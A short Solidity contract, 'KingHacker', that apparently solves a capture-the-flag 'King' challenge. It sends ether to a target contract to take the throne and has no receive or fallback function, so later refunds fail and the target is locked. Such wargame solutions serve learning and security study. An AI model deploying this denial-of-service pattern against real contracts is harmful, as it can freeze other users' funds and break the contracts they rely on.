// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHacker {

  constructor(address targetAddr) payable {
    (bool success, ) = targetAddr.call{value: msg.value}("");
    require(success, "KingHacker: failed to call targetAddr");
  }

}